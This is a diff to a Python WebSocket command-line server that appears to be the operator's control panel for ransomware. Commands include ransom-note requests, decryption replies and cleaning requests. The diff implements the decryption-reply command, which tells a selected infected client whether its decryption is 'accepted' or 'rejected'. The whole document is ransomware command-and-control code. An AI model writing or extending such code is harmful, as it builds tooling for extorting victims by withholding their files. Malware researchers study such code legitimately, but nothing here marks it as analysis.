@@ -124,9 +124,8 @@ class WebSocketCLIServer:
                 case ["ransomnotereq"]:
                     await self.__send_ransom_note_req()
 
-                case ["decryptrep"]:
-                    print("Not implemented yet")
-                    await self.__send_decrypt_rep()
+                case ["decryptrep", *args]:
+                    await self.__send_decrypt_rep(args)
 
                 case ["cleaningreq"]:
                     print("Not implemented yet")
@@ -246,10 +245,20 @@ class WebSocketCLIServer:
         await self.__selected_client.send_message(json.dumps(message))
 
     @check_selected_client
-    async def __send_decrypt_rep(self):
+    async def __send_decrypt_rep(self, args=None):
         """Send a decryption request to the selected client."""
-        #TODO: Implement decryption request
-        pass
+        value = True
+        if len(args) > 0:
+            value = args[0].lower() == "true"
+
+        message = {
+            "type": "decryption_rep",
+            "data": {
+                "status": "accepted" if value else "rejected",
+            }
+        }
+        
+        await self.__selected_client.send_message(json.dumps(message))
 
     @check_selected_client
     async def __send_cleaning_req(self):
